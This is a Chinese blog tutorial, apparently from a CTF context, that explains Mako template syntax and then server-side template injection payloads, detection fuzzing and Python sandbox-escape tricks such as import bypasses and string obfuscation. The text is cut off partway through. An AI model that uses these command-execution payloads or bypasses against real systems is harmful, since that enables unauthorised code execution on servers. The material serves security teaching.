---
title: Mako模板引擎以及沙箱机制
url: https://buaq.net/go-150034.html
source: unSafe.sh - 不安全
date: 2023-02-20
fetch_date: 2025-10-04T07:32:19.484244
---

# Mako模板引擎以及沙箱机制

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

Mako模板引擎以及沙箱机制

上一篇我们介绍了Flask模块下的模板注入漏洞，今天就来讲一讲Mako模板引擎：Mako模板基础：我们还是先进行一下Mako模板的介绍，其相关的语法和用法，在Ma
*2023-2-19 09:33:0
Author: [xz.aliyun.com(查看原文)](/jump-150034.htm)
阅读量:18
收藏*

---

上一篇我们介绍了Flask模块下的模板注入漏洞，今天就来讲一讲Mako模板引擎：

## Mako模板基础：

我们还是先进行一下Mako模板的介绍，其相关的语法和用法，在Mako 是 Pylons 的默认模板语言，就好比 jinja2 和 flask 的关系类似。

### 基础语法

* 变量取值：

  ```
  ${ }：输入 `1+1`，`字符串`，`方法`，都会有执行结果
  显示变量temp的值：${temp}
  变量temp乘2：${temp*2}
  变量temp的平方：${pow(temp,2)}
  ```
* 2、转义符

  在定义变量时，如果其中包含特殊符号时记得要使用转义符转换。u负责转换URL地址，h转换HTML，x对XML进行转义，trim就是去空格啦。

  ```
  url: ${"there is some text"}
  url(with escaping): ${"there is some text" | u}
  执行：
  url: there is some text
  url(with escaping): there+is+some+text##空格被解析为+号
  ```

  ```
  html: ${"show <table>"}
  html(with escaping): ${"show <table>" | h}
  执行：
  html: show <table>
  html(with escaping): show &lt;table&gt;##<>被成功转义
  ```
* 控制结构：

  ```
  %for ... : %endfor
  %if ... : ... %elif: ... % else: ... %endif
  ```
* Python 代码块：
* 导入模块：
* 定义函数：

  ```
  `<%def name="..." > ... </%def>`，调用：`${...()}`
  ```
* 注释：

  ```
  ##（单行）、<%doc>（多行）
  ```
* 其他：

  ```
  继承模板：<%inherit ... />
  包含模板：<%include ... />，
  引用：<%page ... />
  ```

  ==可以看到上面非常依赖 `%`，如果非要用到 `%`，需要写成 `%%`==

对于常用的语法，看一个例子就懂了：

```
from mako.template import Template

tp = Template('''## 这是一个注释
<%def name="my_range(n)" > <% return list(range(n))%> </%def>

<% c = 5 %>

% for i in my_range(c)+a:
    %if i % 2:
        ${ i }
    %endif
% endfor
''')

print(tp.render(a = [5, 6, 7, 8, 9]))
```

我们来解释一下这个代码的含义：

在Mako模板语言创建一个模板，在模板中定义一个名为my\_range的函数，该函数接受一个参数n，返回一个由0到n-1的整数列表，这是整个代码的核心机制

```
<%def name="my_range(n)" > <% return list(range(n))%> </%def>
```

这里定义n为c，c=5，`my_range(c)+a`：把a放入my\_range函数所返回的整数列表中，my\_range返回1，2，3，4，将a放入，整个整数列表就是1-9，然后for循环，i%2返回值只要非零，就输出，即输出所有的奇数：

```
<% c = 5 %>

% for i in my_range(c)+a:
    %if i % 2:
        ${ i }
    %endif
% endfor
```

执行结果：

```
1，3，5，7，9
```

### 过滤器：

上一篇Flask模块下，在ssti绕过中我们提到了attr，他就是jinja2中的过滤器，而Mako过滤器引用更加方便：

单个过滤器的使用和 jinja2 一样很像，都是用 `|` 来引用。如果要使用多个过滤器，mako 需要用 `,` 来指定：

```
${" <tag>some value</tag> " | h,trim}
```

要定义自己的过滤器也比较简单，不需要和 jinj2 一样操作 `environment`，只需要定义一个函数即可使用：

```
<%!
import myfilters

def myescape(text):##定义myescape函数
    return "<TAG>" + text + "</TAG>"
%>

Here's some tagged text: ${"text" | myescape}
Here's some tagged text: ${"text" | myfilters.myescape}##多个连续引用
```

## Mako模板漏洞：

### 常规bypass：

因为Mako模板下完全支持python代码的执行，所以我们不必要去和Flask下jinja2一样去寻找类然后再去调用，可以直接注入python的攻击代码。所以jinja2的利用方法，基本Mako这都能利用，且更简单。

详细的攻击方式请看对应链接，这里就不再水文字了……

例：

直接调用os模块，执行whoami命令。

```
<%!
import os
os.system("whoami")
%>
# 或者
<%__import__("os").system("ls")%>
# 或者
${__import__("os").system("whoami")}
```

### 无回显（特殊变量引用）：

mako 引入了新的默认变量：

```
In [57]: Template("${ locals() }").render()
Out[57]: """
{
  'context': <mako.runtime.Context object at 0x7fd5e8af99d0>,
  'pageargs': {},
  '__M_caller': None,
  '__M_locals': {
    'pageargs': {}
  },
  'locals': <built-in function locals>,
  '__M_writer': <built-in method append of collections.deque object at 0x7fd5c8013ac0>
}
"""
```

这段代码的含义是：

```
使用Mako模板引擎，将locals（）函数的结果渲染为字符串。locals（）函数返回一个字典，其中包含当前上下文中的本地变量，如上下文，参数，调用者，本地变量和写入器。
```

如果在遇到无回显的场景，就可以调用local函数下的 `__M_writer`、`context.write` 进行打印。

例如：

```
from mako.template import Template
tp = Template('''
%for i in x:
  "a"
%endfor
''')
print(tp.render())
```

* 其中 x 是注入点。那么我们就可以用 `str(__M_writer(str(__import__("os").system("id"))))` 来实现回显。当然，盲注或者弹 shell 也是 ok 的。
* 还有一种类型的利用 `context.kwargs` 来获取上下文环境中传递的值。例如一个 web 接口有用到 mako，且有一个参数 name，那么可以直接在模板中使用这个变量名，这个时候通常需要 eval 下。

## 确定Mako框架：

这里我们系统讲解一下在已知SSTI的情况下，漏洞究竟出现在什么模板引擎下。

看了一下是个提交框，我们提交什么返回什么，所以初步认定是SSTI，首先我们要知道python的模板模型，才能够确定我们的攻击方式。

### SSTI 的简单探测：

最常用的方法是通过注入模板表达式中常用的一系列特殊字符来尝试模糊模板 ————这也被称作 fuzz 测试，例如`${{<%[%'"}}%\`

如果服务器返回了相关的异常语句则说明服务器可能在解析模板语法，然而 SSTI 漏洞会出现在两个不同的上下文中，并且需要使用各自的检测方法来进一步检测 SSTI 漏洞。

#### 一、纯文字上下文

有的模板引擎会将模板语句渲染成 HTML，例如 Freemarker

```
render('Hello' + username) --> Hello Apce
```

因为会渲染成 HTML，所以这还可以导致 XSS 漏洞。但是模板引擎会自动执行数学运算，所以如果我们输入一个运算，例如

```
http://vulnerable-website.com/?username=${7*7}
```

如果模板引擎最后返回 Hello 49 则说明存在 SSTI 漏洞。而且不同的模板引擎的数学运算的语法有些不同，还需要查阅相关资料的。

#### 二、代码上下文

以这样一段代码为例，同样是用来生成邮件的.

```
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```

上面代码通过获取静态查询参数 greeting 的值然后再填充到模板语句中，但是就像 SQL 注入一样，如果我们提前将双花括号闭合，然后就可以注入自定义的语句了。

#### 三.确定 Web 界面所用的模板引擎:

* 这也算是探测的一种吧，但是这种探测是基于已知 SSTI 漏洞存在的二次探测，一般的做法是触发报错。

触发报错的方式很多，这里以 Ruby 的 ERB 引擎为例，输入无效表达式`<%foobar%>`触发报错。可以得到如下报销信息

```
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'
```

* 根据不同的报错得到不同的模板引擎
* 有的时候相同的 payload 可能会有两种响应，比如`{{7*’7’}}`在 Twig 中会的到 49，而在 Jinja2 中会得到 7777777。

单字符fuzz测试：

```
from time import sleep
import requests
import urllib
from bs4 import BeautifulSoup
url = "http://127.0.0.1:9999"
for i in range(32, 127):
    html = chr(i)
    # print(html)
    data = {'html': html}
    # 会自动url编码，不需要手动编码
    r = requests.post(url=url + '/generate', data=data)
    soup = BeautifulSoup(r.content, 'lxml')
    if (soup.find_all('a')):
        item = soup.find_all('a')[0].get('href')[1:]
        # 注：有两个.不能直接replace
        # print(item)
        r2 = requests.get(url=url + item)
        # print(r2.url)
        # print(r.status_code)
        with open('1.txt', 'a+') as f:
            f.write(html + ":" + str(r2.status_code) + "\n" + r2.text + "\n")
            print(str(i))
            f.close()
    else:
        with open('1.txt', 'a+') as f:
            f.write(html + ":" + r.text + "\n")
            print(str(i))
            f.close()
    # sleep(2)
```

对这个题进行了fuzz之后发现过滤了如下字符：

```
%>  />  _  +  $  [  '  "
chr  ord  hex  eval  exce
"
$
'
*
+
-
/
[
]
_
```

因为Mako可以直接利用python的代码来执行，用Mako循环语法测试。结果渲染了3个1，证明确实是mako框架。

```
%for a in (1,2,3):
1
%endfor
```

## 沙箱机制：

让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数。Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。

### 执行系统命令：

### import绕过：

首先，禁用 `import os` 肯定是不行的，因为:

```
import  os
import   os
import    os
```

如果多个空格也过滤了，Python 能够 import 的可不止 `import`：

```
__import__：__import__('os')

importlib：importlib.import_module('os').system('ls')
```

其实import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 `execfile` 来代替，只适用于python2版本：

```
execfile('/usr/lib/python2.7/os.py')
system('ls')
```

python2和python3兼容方法：

```
with open('/usr/lib/python3.6/os.py','r') as f:
    exec(f.read())
system('ls')
```

不过使用上面的这两种方法，就必须知道==库的路径==。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：

```
import sys
print(sys.path)
```

### 字符串绕过：

代码中如果出现 `os`被过滤：那么可以利用字符串的各种变化来引入 os：

```
__import__('so'[::-1]).system('ls')
```

```
b = 'o'
a = 's'
__import__(a+b).system('ls')
```

还可以利用 `eval` 或者 `exec`：

```
eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
#macr0phag3
0
exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
#macr0phag3
```

一串连等：

```
['__builtins__'] ==
['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'] ==
[u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'] ==
['X19idWlsdGluc19f'.decode('base64')] ==
['__buil'+'tins__'] ==
['__buil''tins__'] ==
['__buil'.__add__('tins__')] ==
["_builtins_".join("__")] ==
['%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]
```

最后一个有点通杀的感觉。

### 恢复 sys.modules：

* `sys.modules` 是一个字典，里面储存了加载过的模块信息。
* 如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。
* 有些库例如 `os` 是默认被加载进来的，但是不能直接使用（但是可以通过 `sys.modules` 来使用，例如 `sys.modules["os"]`），原因在于 sys.modules 中未经 import 加载的模块...